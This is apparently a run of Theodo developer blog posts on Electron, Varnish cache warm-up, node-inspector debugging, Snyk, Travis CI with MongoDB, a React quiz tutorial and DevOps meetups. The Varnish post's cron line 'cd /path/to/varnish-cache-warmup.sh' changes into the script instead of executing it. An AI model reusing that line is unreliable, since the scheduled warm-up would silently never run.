To convince you of how easy running an Angular app with Electron is, checkout our work on our repository.
As explained in the “Unleash the power of AngularJS for your desktop app” readme, we chose a sample Angular app on Github. With no further change to Electron’s configuration, we copy/pasted the app’s code in our client folder. And there it was, running on any given platform, whether it was a Linux, a Windows or a Mac computer thanks to the power of Electron.
To infinity and beyond
Coding with Electron, we realised it offered us even more possibilities than coding a regular Angular app intended for running in a browser.
Indeed, one of the main advantages of Electron was our app’s ability to communicate directly with our user’s computer through Node modules. This means you can easily write files on the computer, access its information etc…
A whole world of new opportunities, from which we have selected a few that will be detailed in following articles. Stay tuned!
 
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Pouliquen
  			
  				Fullstack Web developer at Theodo, and curious about any new technology!  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Vincent Quagliaro
  			
  				Fullstack Web developer at Theodo  			
  		
    
			

									"
"
										Caching data with varnish allows to deal with heavy data traffic at a limited cost.

The question is, how can I serve fresh data even if no one have requested them recently? The solution is to request your cache regularly.

This is how I managed to auto warm up a list of URLs in my varnish cache every hour.

First, I add the urls I want refreshed in a urls.txt file like this:
/dashboard/1
/dashboard/2
/dashboard/3

Note that this url list is static but you can easily feed it automatically with a background job of yours.

Then, I need to add specific code to my config.vcl file:
acl warmuper_ip {
    ""10.20.30.40"";
}

sub vcl_recv {
    # the script varnish-cache-warmup.sh must always refresh the cache
    if (client.ip ~ warmuper_ip && req.http.Cache-Control ~ ""no-cache"") {
        set req.hash_always_miss = true;
    }
}

Then, I create a varnish-cache-warmup.sh script to actually warmup the varnish cache:
#!/bin/bash
wget --output-document=/dev/null --header='Cache-Control: no-cache' --tries=1 --quiet --base=http://domain.com --input-file=/path/to/urls.txt

In order to test your script you’ll have to look at varnish logs. Here is a command that may help varnishlog -c | grep ReqURL.
Eventually, I add this cron task with crontab -e:
0 * * * * cd /path/to/varnish-cache-warmup.sh
And that is it!

Here are some helpful resources:

http://info.varnish-software.com/blog/warming-varnish-cache-varnishreplay
http://www.htpcguides.com/smart-warm-up-your-wordpress-varnish-cache-scripts/
https://stackoverflow.com/questions/14210099/varnish-cache-initial-cache-of-web-pages
https://github.com/aondio/Varnish-Cache-Warmup/blob/master/warmup.sh


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Raphaël Dubigny
  			
  				Raphaël is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  			
  		
    
			

									"
"
										Each time you use form collections in Symfony, you need to write some JavaScript.
The cookbook
If you don’t know what form collections are you won’t be interested in this article now. However you can read the cookbook out of curiosity and come back read this article later.
Doing form collections with Symfony can be a tedious task because Symfony doesn’t (and shouldn’t) embed the JavaScript to have a basic but working form collections out of the box.
In order to make it work you have to “copy” and adapt some JavaScript from the cookbook. You may even be tempted to duplicate this JavaScript code accross your project.
A simple JavaScript file to the rescue
Therefore I wrote a single JavaScript file to help regarding this matter. You can find it here. In this repository there is a complete documentation and some examples.
The JavaScript file relies on html classes to enable the default behavior of adding and deleting elements to/from your collection thus your work is to add the classes in your template files. For the most simple cases you won’t need to write a single line of JavaScript.
The JavaScript code throws events before and after each action to let you customize each behavior. Each class or event name can be configured to your need at different levels.
Despite the customization options, if you have to implement complex behaviors, this file may not be a solution for you. Nevertheless you can modify it to suit your needs.
Next step
Try it on your computer.
If you’ve never done form collections with Symfony before, you really should follow the cookbook in order to understand how Symfony works with form collections.
If you want to know more about what is possible, you may want to read the documentation.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				jeanlucc
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										As a developer, you get to debug your code very often. In JavaScript this is done
in the browser. Each browser having a different debugger, you may find out some
better than others but the truth is they are all very handy. However, this is for
in-browser JavaScript. What about server side JavaScript, the one you run
with node, iojs or some sexy compiler like coffee?
Usual front-end debugging
A lot of developers still use those ugly, yet handy console.log all around
the code to test the content of variables. This is usually a poor practice.
Placing a debugger instruction or, even better, using breakpoints, pauses the
execution workflow and lets you use watchers and the console to see the content
of the variables and to play around with them.

But this is only for front-end code, isn’t it?
Nope.
You can actually use the same debugger interface for your Node.js app and
forget about the console debugger, which is fully functional but feels slower
to use because you need to use lines number to place breakpoints.

Better back-end debugging
In order to get that nice debugging interface we need to use either Chrome or
Opera, and to use the node-inspector node package. Install it globally:
npm install -g node-inspector

If your application is written in JavaScript or if you have a js version of it
you can directly run your server and debugger with:
node-debug --no-preload server.js

I recommend using the --no-preload option since I have had big delays when not using it. It’s up to you to play around with it!
This will run your server and also serve a webpage containing the debugger. By
default this is run on port 8080, so you may need to change it using the -p
option. If your default browser is Chrome or Opera, this will also open it on a
new tab. Otherwise you will have to open it by yourself.
You will have access to a nifty interface. It’s basically the browser’s debugger
in fullscreen.

Using it with CoffeeScript (or any other compiler/transpiler)
In order to launch the debugger with compilers like CoffeeScript, you’ll have to
launch two different processes. One for your server and another for the debugger
interface.
When starting the server you must make it listen for debugger instructions. This
may vary depending on the compiler/transpiler. For CoffeeScript you can directly
pass options to the node command:
Therefore instead of doing
node --debug app.js

You can write:
coffee --nodejs --debug app.coffee

This will listen for debugging instructions on port 5858 (can be modified). We
can now launch the debugger interface with:
node-inspector

Again, if your default browser is Chrome or Opera, this will also open it on a
new tab. Otherwise you will have to open it by yourself.
Running inside a virtual machine or container
If you run your code inside a docker container or
vagrant virtual machine, you will notice this
doesn’t work. Furthermore where should you launch the inspector from?
Before going on, I would like to recall about the ports. In order to use
node-inspector, we need to use two different ports:

The debugger port, which defaults to 5858. This allows our two processes
to communicate together. This can be changed by directly passing an argument
to the debug option: --debug=5856
The interface port, which defaults to 8080. This is basically a web server
that allows us, the developer, to place breakpoints, live edit the code,
etc. You can set this port by passing the web-port option with a parameter
-web-port 10100.

If those ports are already being used by some processes you will have to use
the options mentioned above. Understanding this will help you not to mess up.
Yet this is not enough. When running a server within a container, you also need
to run the node-inspector inside the container. Therefore you need to set the
address of the web server to match container’s.
Example
To put it in a nutshell, let’s say I am running my server inside a vagrant with
a local ip of 199.199.199.42. Also I am already using the ports 5858 and 8080 so
I’ll have to use others.
If you want to test you can use the simple js file:
var http = require('http');

// I won't be able to use it for the debugger interface
const PORT = 8080;

function handleRequest(request, response) {
  response.end('It Works!! Path Hit: ' + request.url);
}

var server = http.createServer(handleRequest);

server.listen(PORT, function() {
  console.log(""Server listening on: http://localhost:%s"", PORT);
});

First, start the server in debug mode:
node --debug=5656 server.js

Then start the node-inspector:
node-inspector --web-host=199.199.199.42 --debug-port=5656 --web-port=10100 --no-preload

This will output something like Visit http://199.199.199.42:10100/?ws=199.199.199.42:10100&port=5656 to start debugging. and won’t open a tab on your browser.
Finally go to the provided address on your host and start debugging!
Side notes

It is important to note the difference between node debug server.js and node --debug server.js. The first one will directly launch the debugger on the
console while the second one opens a port to listen for debugging instructions.
You can also break right after launching the application by using the
--debug-brk option. Which is useful to manually enter some breakpoints at
given lines
Long parameters were used to improve readability:

--web-port can be shortened to -p
--debug-port can be shortened to -d



 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Eduardo San Martin Morote
  			
  				Eduardo, aka posva, loves development tools and enjoy creating libs. He prefers should over expect and hates technical debt  			
  		
    
			

									"
"
										
Trusting your dependencies a bit too much?
I just attended a great keynote at Velocity 2015 in Amsterdam, by Guy Podjarny (@guypod) and Assaf Hefetz, founders of Snyk.io, a tool in beta which was just unveiled. The keynote highlighted how most developers are blindly trusting third-party open-source dependencies. It also introduced a package and a service making it easy for one to find vulnerabilities, and in some case to fix them.
About 11% of npm dependencies include vulnerabilities, and it often takes a very long time for those to be fixed, if it ever happens. Still think your package is as secure as it gets?
Snyk
Snyk is a Node.js CLI package, which can thus be very easily globally installed with
npm install -g snyk

It provides a command which will test, using the Snyk API, your Node.js dependencies in a recursive fashion, not only finding your package’s dependencies, but also your package’s dependencies’ dependencies.
snyk test

If snyk has nothing on you, snyk won’t be able to help any further. But if not, it also provides another command to fix dependencies by:

Updating dependencies which now provide fixes for found vulnerabilities.
Adding patches for those which do not.
Adding the test command to your testing worflow, with an integration to your CI system.
Allowing the installation of the patches to your install workflow, on npm’s postinstall step.
Adding comments for vulnerabilities you do not want to fix for some reasons.
Monitoring fixes and patches for vulnerabilities which are yet to be fixed.


All those features are available through an interactive prompt using the following command:
snyk protect -i
Sounds good?
Snyk seems like a promising tool, as it automatically detects some security flaws, which are often overlooked when building applications with development speed as the main focus.
Since it just launched in Beta, I’m guessing Snyk.io‘s team is eager to get some feedback.
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Woody Rousseau
  			
  				Woody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  			
  		
    
			

									"
"
										Sourcing candidates for recruitment, managing your online reputation, populating databases… did you ever dream about a tool that does all these repetitive and boring tasks for you?
1. profilr.co
This app uses Google search engine to generate advanced search among thousands of profiles on social networks corresponding to your criteria.
Examples:

Ruby developers in San Francisco on Linkedin
People working at Google on Google+
Designers in Berlin on Dribbble

2. buffer.com
Buffer is an awesome company that advocates transparency. They provide a simple and easy social media scheduling.
You can add updates to your Buffer queue and they will be posted for you well spaced out over the day and at the best times.
It’s like your magic box you can fill up anytime with great Tweets, Facebook stories or LinkedIn updates. Just drop them in and you don’t have to ever worry about when it will be posted, Buffer takes care of it for you.
Buffer provides Chrome, Firefox and Safari plugin to post from any website without ever needing to visit Twitter, Facebook on LinkedIn.
Bonus: buffer.com/pablo
3. ifttt.com
“If This Then That” allows you to perform an action whenever another one is triggered. You can basically use it as a glue between two services

Bonus: do more with just a tap. Configure a repetitive task and execute it by taping on your smartphone.

4. zapier.com
Connect the apps you use, automate tasks, get more out of your data. Similar to IFTTT but it provides more apps and options such as reading Google spreadsheet or Trello cards. I use it to backup all my tweets in a spreadsheet to make research easier later.
5. netvibes.com/dashboardofthings
Last apps connector but not least, Dashboard of Things by our friends from Netvibes. Similar to Zapier but provides more conditionnal trigger. You can add threshold and `else` condition.
6 examples of `potions`:

You can create all `potions` you want using all these `ingredients`. Enjoy!
6. import.io

“Instantly turn web pages into data”. Feed it with some url and it will automatically parse the webpage and extract the main collection. Then you can choose to export data into .csv file, Google Sheets or generate an API.
7. kimonolabs.com
“Turn websites into structured APIs from your browser in seconds”. It’s a import.io competitor with more options.
8. Google apps
Last but not least, Google apps. You can easily connect them together.
For example, I use Google Analytics to collect customer insights. Then I import it in a Google Sheet with a Spreadsheet plugin and generate graphs. Finally I share those graphs on a Google Sites open to the company organization. The result is a Website Analytics Dashboard for the company without typing one line of code.
9. What are yours?
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jonathan Beurel
  			
  				Jonathan Beurel - Web Developer. Twitter : @jonathanbeurel  			
  		
    
			

									"
"
										
The new Travis Docker infrastructure
Late December 2014, Travis announced the implementation of their new infrastructure based on Docker containers in order to improve build capacity, build start time, and resources usage. You can learn more about it on this very detailed article: Faster Builds with Container-Based Infrastructure and Docker
As we can read on the Travis documentation about how to use this infrastructure, adding one line only on our .travis.yml is necessary :
  sudo: false

Why simply not adding this line to my .travis.yml file?
As I had to use a specific MongoDB version that I couldn’t choose on the Travis apt-source-white-list, I was forced to install MongoDB as I found on this great article from Maxime Thoonsen and then fated to run my tests on the Travis legacy infrastructure
before_script:
  - sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10
  - echo 'deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen' | sudo tee /etc/apt/sources.list.d/mongodb.list
  - sudo apt-get update
  - sudo apt-get install -y mongodb-org=2.6.6 mongodb-org-server=2.6.6 mongodb-org-shell=2.6.6 mongodb-org-mongos=2.6.6 mongodb-org-tools=2.6.6
  - sleep 15 #mongo may not respond immediatly
  - mongo --version

How to install it without sudo?
First, as we can find on the Travis documentation, we have to add this line at the beginning of our .travis.yml.
sudo: false

services:
  - docker
  - mongodb

Then, we specify the MongoDB version we want to use for our tests.
env:
  global:
    - MONGODB_VERSION=2.6.10

Finally, we can download the MongoDB archive we want and install it in a specific directory.
 before_install:
  - wget http://fastdl.mongodb.org/linux/mongodb-linux-x86_64-$MONGODB_VERSION.tgz
  - tar xfz mongodb-linux-x86_64-$MONGODB_VERSION.tgz
  - export PATH=`pwd`/mongodb-linux-x86_64-$MONGODB_VERSION/bin:$PATH
  - mkdir -p data/db
  - mongod --dbpath=data/db &
  - sleep 3

Congrats, you are done with it !
If you want to check if your build has been successfully executed on the container infrastructure, look for the following lines on your Travis build logs.

The directs improvements we have seen
First, as advertised by Travis, our builds that sometimes needed several minutes to start, now systematically start within less than 10 seconds.
Secondly, the build speed itself has also increased sharply as you can see on the samples above.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Thibaut Cheymol
  			
  				Thibaut is a full-stack web developer. Passionate about Javascript, he has a preference for ReactJs  			
  		
    
			

									"
"
										This blog post is in French as the event it relates to is French-only.
Comme tous les premiers mardi du mois, le groupe Paris Devops a organisé son meetup, cette fois-ci dans les locaux de Dailymotion. Paris Devops est un groupe qui promeut la culture DevOps dans le milieu de l’entreprise.

Un Open Space pour mieux discuter
Alors que c’était ma première participation à ce meetup, j’ai été agréablement surpris par le format proposé pour cette soirée. Après une présentation de 30-45 minutes et le pot habituel, la séance s’est transformée en Open Space, ce qui a ouvert le terrain à plusieurs sujets de discussion très intéressants.
Pour ceux qui ne sont pas familiers avec le déroulement d’un Open Space, les grandes lignes en sont :
+ Toute personne peut proposer un sujet de discussion
+ Chacun vote pour les sujets qu’il souhaite
+ Les sujets principaux sont répartis en différents lieux et créneaux horaires
+ Chacun est ensuite libre de choisir l’endroit où il souhaite se rendre pour participer à la discussion
D’autres règles sont mises en place pour faciliter son bon fonctionnement, qui sont résumées ici.
Une question récurrente : Comment convaincre et répandre la philosophie Devops autour de soi
Parmi les trois sujets de discussion auxquels j’ai pu participer lors de cette soirée, deux touchaient du doigt la même problématique : le partage de la culture DevOps autour de soi.
Dans les deux cas, le principal problème des personnes ayant proposé leur expérience à la discussion semblaient frustrés par un manque de communication entre les traditionnels “dev” et “ops”.
La sécurité : l’affaire de tous
Par exemple, l’initiateur d’un de ces sujets, ayant un rôle d’administrateur réseau dans son entreprise, regrettait un manque d’intérêt de la part des développeurs à propos des questions de sécurité informatique et cherchait des moyens d’arriver à sensibiliser tout le monde à ces questions.
A l’heure actuelle, il lui arrivait encore fréquemment, avec son équipe, de devoir corriger lui-même des failles de sécurité dans le code prêt à être déployé en production, ce qui arriverait bien plus rarement si les développeurs étaient conscients et attentifs à ces questions.
Un point soulevé lors de cette discussion, et que j’ai trouvé intéressant, était que la mise en place d’outils automatiques pour détecter les failles connues ou monitorer le code produit n’était en aucun cas une solution pérenne. Pour les personnes présentes, cela revenait plutôt à vouloir mettre un sparadrap sur la fissure d’un mur.
En effet, plus la sécurité mise en place du côté des administrateurs réseau est importante, moins les développeurs ont à être vigilants sur la qualité du code produit. Cette baisse de vigilance entraîne la multiplication de failles de sécurité dans le code délivré pour la mise en production.
La démonstration par l’exemple est sortie du débat comme une solution efficace, point auquel je me rallie facilement après en avoir fait l’expérience lors de notre séjour à Amsterdam pour la Velocity Conf.
Les créateurs de Snyk, un outil présenté en plus grand détail par Woody Rousseau, ont, depuis la scène de l’amphithéâtre, démontré comment des hackers pouvaient profiter de failles connues, et présentes dans certains packages NPM que nous utilisons, pour dénaturer le contenu d’un site voire éteindre le serveur sur lequel se trouve ce site !
Culture Ops : comment l’acquérir ?
L’autre discussion traitait de l’opposition entre quelqu’un et son manager à propos de la formation Ops donnée aux développeurs de son entreprise. Ce responsable ne voulait pas que les développeurs utilisent un provisioning Ansible que cette personne avait créée, parce qu’il estimait nécessaire que ses développeurs apprennent à monter leur machine depuis la base à la main plutôt que d’utiliser un provisioning tout fait.
La discussion tournait donc sur la manière de présenter les nouveaux outils de déploiement à ce responsable ainsi qu’aux autres développeurs, à le faire par exemple progressivement pour que les développeurs gardent une part active dans la construction du provisioning et apprennent à maîtriser ces outils modernes.
Un meetup intéressant, ouvert et qui ne demande qu’à prendre de l’ampleur
Cette soirée a été un très bon moment. Les questions étaient très ouvertes et pertinentes, nous concernant tous dans notre travail de tous les jours.
Les différentes personnes personnes présentes lors de cette soirée ont pu apporter des réponses toujours intéressantes aux questions posées.
Malgré tout, ce meetup reste encore assez peu connu et se déroule en petit comité (~30 personnes). Alors si vous avez envie de découvrir un peu plus les dessous de la philosophie DevOps, de voir quelles sont les questions qui sont posées autour de ce sujet ou d’apporter votre expérience quant à sa mise en pratique, n’hésitez surtout pas et suivez leur actualité sur leur site.
A très bientôt lors de leur prochain meetup !
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Pouliquen
  			
  				Fullstack Web developer at Theodo, and curious about any new technology!  			
  		
    
			

									"
"
										
Electron, formerly known as Atom Shell, is an awesome framework that lets you develop and build applications for all operating systems as seamlessly as possible! Here is how we started working with it and appreciating it!

How we came across Electron
At Theodo, we are specialised in web technologies (Symfony2, NodeJs, AngularJs) and we build apps or websites for our clients. Thus, when a former client came back to us with the project of a desktop application for Windows computers, this could have seemed far from our area of work, if not for Electron!
What is Electron?
To quote the Electron creators :
You could see it as a minimal Chromium browser, controlled by JavaScript.
To be more complete, Electron is a framework that ships a NodeJS backend used with an instance of Chromium to render web pages inside a desktop app, regardless of which operating system your app is running on.
And this is its main advantage! Forget about any problem of cross-compatibility (either between OS or browsers) that you encountered before! Your app will be running in the same Chromium version, with the same NodeJS version, regardless of the user’s computer.
Built and backed by Github, this project was at first used to run the famous Github IDE : Atom. However, it has outgrown its original use and its creators decided to separate it from the Atom project (thus the renaming to Electron) in April 2015.
Concretely, the Electron framework is based on two types of processes.
The main process
This process (one by application) corresponds to what we would usually call the back-end of our application. It handles the different renderer processes created by our app (see below for more detailed information about the renderer process) and the communication between our app and the user’s computer via NodeJS.
The renderer process
Each renderer process of our app handles the displaying of a Chromium instance in a desktop window and the rendering of our app in this window. Electron provides modules to allow communication either asynchronously or synchronously with the main process to allow direct access to Node modules.
To the difference of usual browser windows, Electron’s renderer processes thus have access to native resources of the computer.
A minimal Electron app (source: Electron’s Quick Start Guide)
For this section, be sure to have installed Electron globally by executing the following command:
$ npm install -g electron-prebuilt

To show you how easy it was for us to start working on Electron, here are the code snippets required to launch your app.
The most basic app would be structured like this:
your-app/
├── package.json
├── main.js
└── index.html

The package.json file is there to specify the main script of your app, so the minimal file would be:
{
  ""name""    : ""your-app"",
  ""version"" : ""0.1.0"",
  ""main""    : ""main.js""
}

The main process of our app is handled by the main.js script. The default script given by Electron’s documentation is:
var app = require('app');  // Module to control application life.
var BrowserWindow = require('browser-window');  // Module to create native browser window.

// Report crashes to our server.
require('crash-reporter').start();

// Keep a global reference of the window object, if you don't, the window will
// be closed automatically when the JavaScript object is garbage collected.
var mainWindow = null;

// Quit when all windows are closed.
app.on('window-all-closed', function() {
  // On OS X it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform != 'darwin') {
    app.quit();
  }
});

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
app.on('ready', function() {
  // Create the browser window.
  mainWindow = new BrowserWindow({width: 800, height: 600});

  // and load the index.html of the app.
  mainWindow.loadUrl('file://' + __dirname + '/index.html');

  // Open the DevTools.
  mainWindow.openDevTools();

  // Emitted when the window is closed.
  mainWindow.on('closed', function() {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    mainWindow = null;
  });
});

With this, we have our back-end running and we only need to tell our application what to display to our user. This is done via the mainWindow.loadUrl('file://' + __dirname + '/index.html'); in the above script.
All you need is then a basic HTML page such as:
<!DOCTYPE html>
<html>
  <head>
    <meta charset=""UTF-8"">
    <title>Hello World!</title>
  </head>
  <body>
    <h1>Hello World!</h1>
    We are using Node.js <script>document.write(process.version)</script>
    and Electron <script>document.write(process.versions['electron'])</script>.
  </body>
</html>

Congratulations, you can now start your first Electron app by running electron . from the command-line in the app folder. It is now up to you to enrich your user’s experience!
How it helped us answer our client’s need
In addition to Electron’s minimal app, we used two very useful npm packages :

Electron packager : this package parses your app folder and creates the files needed to launch the app on any platform that you specify
 Electron builder : this package starts with the files generated by electron-packager and creates a single installer for OSX or Windows computers to help you easily distribute your app.

With this base in place, we could get back in our area of expertise as all that was left for us to do was to develop our app as we would have for a traditional AngularJS app (with the exception of some points due to the particularities of an offline desktop application that will be detailed in future articles).
If you ever feel like trying out Electron, here is a repository including Electron, Electron packager and Electron builder to get you up and running as fast and possible and deliver your apps on any platform! Just follow the README instructions!
Check out the Awesome Electron repository for a quick glance of some well-known Electron projects!
 
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Pouliquen
  			
  				Fullstack Web developer at Theodo, and curious about any new technology!  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Vincent Quagliaro
  			
  				Fullstack Web developer at Theodo  			
  		
    
			

									"
"
										This is a quick tutorial showing how you can develop a simple and reusable component using ReactJS.
The need
We want a component that can display a quiz.
We need to display a question, allow the user to select one or more answers, validate its answers and go to the next question.
After all questions have been answered we’d like to inform the user of its score and list the questions where he was right or false.
Quiz data (quiz title, questions and answers) can be fetched from an api returning a formatted json (we’ll use a local json file for the tutorial).
Getting it Done
ReactJs components must define a render method which returns the html they have to display depending on their properties and state.
For our use case, we will split our component in two components: a main component Quiz representing the whole quiz and a stateless Question component. The Quiz component state contains: quiz data, user answers and current question to display.
Question component properties are: question id, question data and two callback methods: one to add an answer choice and one to validate all choices (and go to the next question).
We first create an empty React Quiz component and export it:
var React = require('react');
var $ = require('jquery'); // We will need it later to get the quiz JSON
var Quiz = React.createClass({
});
module.exports = Quiz;

Then the state is initiated as follows:
getInitialState: function(){
  return {
    quiz: {},
    user_answers: [],
    step: 0
  }
},

quiz is an object which contains quiz data. user_answers evolves as the user adds its choices to questions. step indicates the current question and is initializated to 0.
We now need to load quiz data from a json file and update the state consequently. For this, we use the componentDidMount method which is called just after the initial render.
When state is updated render method is called again, this time with quiz data.
componentDidMount: function(quizId){
  $.getJSON(""./assets/quiz.json"", function(result) {
    this.setState({quiz: result});
  }.bind(this))
},

Quiz data is stored in a json file formatted as follow:
{
  ""title"": ""Quiz title"",
  ""questions"": [
    {
      ""question"": ""What is the first question?"",
      ""answers"": [
        {
          ""is_right"": true,
          ""value"": ""This one""
        },
        {
          ""is_right"": false,
          ""value"": ""The next one""
        },
        ...
      ]
    }
    ...
  ]
}
Our component has all the data it needs to display a quiz. We can add a few methods to make it dynamic: go to the next question, add a user answer, compute the current score:
nextStep: function(){
  this.setState({step: (this.state.step + 1)});
},

setAnswer: function(event){
  this.state.user_answers[this.state.step] = this.state.user_answers[this.state.step] || [];
  this.state.user_answers[this.state.step][parseInt(event.target.value)] = event.target.checked;
},

isAnswerRight: function(index){
  var result = true;
 
  Object.keys(this.state.quiz.questions[index].answers).map(function(value, answer_index){
    var answer = this.state.quiz.questions[index].answers[value]
    if (!this.state.user_answers[index] || (answer.is_right != (this.state.user_answers[index][value] || false))) {
      result = false;
    }
  }.bind(this));
  return result;
},

computeScore: function(){
  var score = 0
  Object.keys(this.state.quiz.questions).map(function(value, index){
    if (this.isAnswerRight(index)) {
      score = score + 1;
    }
  }.bind(this));
  return score;
},
Finally we can write the render method. We want our component to display two types of screen; a question with its available answers and the result of a quiz session. Our main render calls one of them based on the current state:
render: function(){
  if (!this.state.quiz.questions) {return <div></div>}
  return (
    <div>
      <h1>{this.state.quiz.title}</h1>
      {(this.state.step < this.state.quiz.questions.length
        ? (<Question
            id={this.state.step}
            data={this.state.quiz.questions[this.state.step]}
            validateAnswers={this.nextStep}
             setAnswer={this.setAnswer}/>)
        : (<div>{this.renderResult()}</div>)
      )}
    </div>
  )
}

The Question component simply defines a render method using properties given by Quiz component, and calls callbacks when the user interacts with it:
var React = require('react');
var Question = React.createClass({
  propTypes: {
    setAnswer: React.PropTypes.func,
    validateAnswers: React.PropTypes.func,
    data: React.PropTypes.obj
  },

  render: function(){
    var answersNodes = Object.keys(this.props.data.answers).map(function(value, index){
      return (
        <div>
          <input
            id={""answer-input-"" + index}
            type=""checkbox""
            value={value}
            onChange={this.props.setAnswer}
            defaultChecked={false}/>
          <label htmlFor={""answer-input-"" + index}>
            {(parseInt(index) + 1) + "": "" + this.props.data.answers[index].value}
          </label>
        </div>
      )
    }.bind(this));

    return (
      <div>
        <h4>{(parseInt(this.props.id) + 1) + "": "" + this.props.data.question}</h4>
        <form>
          {answersNodes}
        <br/>
        <button type=""button"" onClick={this.props.validateAnswers}>
          Validate answer
        </button>
        </form>
      </div>
    );
  }
});
module.exports = Question;

renderResult calls the isAnswerRight method to list result for each question:
renderResult: function(){
  var result = Object.keys(this.state.quiz.questions).map(function(value, index){
    if (this.isAnswerRight(value)) {
      return (<div>{""Question "" + index + "": You were right!""}</div>)
    } else {
      return (<div>{""Question "" + index + "": You were wrong!""}</div>)
    }
  }.bind(this));
}

Installation
You can locally install the project on your computer.
Requirements: npm must be installed on your computer, you can use httpster to serve the files.
git clone git@github.com:bbonny/quiz-react.git
cd quiz-react
npm install
./node_modules/gulp/bin/gulp.js
In an other, shell launch httpster:
cd quiz-react/dist
httpster

You can now access the quiz locally: http://localhost:3333
Github
Full source code can be found here: https://github.com/bbonny/quiz-react/
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Bonny
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Theodo est heureux d’accueillir le Symfony Pot du mois d’octobre !
Tout d’abord un petit mot sur les fameux SfPot (pour les intimes 😉 ). Le principe est de se regrouper un soir par mois autour de 2-3 talks en lien avec Symfony. Les sujets restent néanmoins très ouverts et variés car un développeur Symfony pourra également utiliser d’autres outils comme React, Travis ou Capistrano… Les SfPot sont organisés par l’AFSY le 3ème mardi du mois. Les talks sont suivis d’un moment plus informel autour d’un pot et cette fois c’est Theodo qui régale !
Cette session commencera à 19h30 avec :

Matthieu Moquet de BlaClaCar, qui nous parlera de « CQRS & Event sourcing »
Rémy Luciani de Theodo, qui enchainera sur « Le guide du développeur agile »

Ensuite on se retrouvera autour de pizzas et de quelques boissons jusqu’à 22h environ. Alors… inscrivez-vous au meetup !
Theodo est également présent à d’autres Meetup (NodeJS, AngularJs, ReactJS…) et notamment aux précédents Human Talk. On se fera un plaisir de vous y croiser !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Reynald Mandel
  			
  				After two start-ups creations in web & photography, Reynald joined Theodo to sharpen his skills in Symfony2 and in development in general. As an architect-developper and coach, he helps the teams & the clients to succeed in their projects and use the best practices both in code and agile methodology.  			
  		
    
			

									"
"
										
A new blog post on D3.js! Last time Jean-Rémi made this very nice article on the force layout. This time will we show you how we drew this worldmap of where the Theodoers have traveled.
We started from this techslides demo to have countries grouped by continent. We simplified the map a little bit to make it easier to handle. We then colorized our map with the Theodoers traveling history. Finally, we added the ability to zoom in and zoom out.
The architecture is very simple with three directories and four important files:

data/continent-geogame-110m-countrieszoom.json the data used to draw the countries of the map.
data/dataTheodoTravels.json, the datafile we use to color the map.
index.html
js/map.js, the file where the map is actually rendered and where all the logic is.

The other files are the D3.js core files and topojson.
If you want to reuse the map, just change the js/map.js file. We made severals steps to make it easier to understand.
We tried to fill it with useful comments so the best way to understand how it works is to have a look at the lightest version of the code. Then you can look at the more complete versions and make your own version.
If you have any questions, you can ping us on twitter: @jiherr and @maxthoon
Jean-Rémi and Maxime

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										
A README template for better information storage
At Theodo, we are used to working on different kinds of projects. We work on massive projects, with many developers and a long time of development involved. We work on very complex projects, with specific technologies or infrastructures, that we’re not always familiar with. We also work on pretty simple and straight-forward projects, but with a lot of existing code.
These situations lead us to some kind of “information volatility hazard”: there is a risk that information gets lost from a developer to another, gets forgotten between the beginning and the end of the project, or simply that you don’t manage to solve a problem in an easy way, just because you can’t see the problem has already been handled before.
After working on various projects, I became sensitive to the way information gets transmitted among the team, and (even more important) how it is described. The worst thing that can happen in a project is when a developer takes some time to write documentation, and the rest of the team can’t find the crucial information.
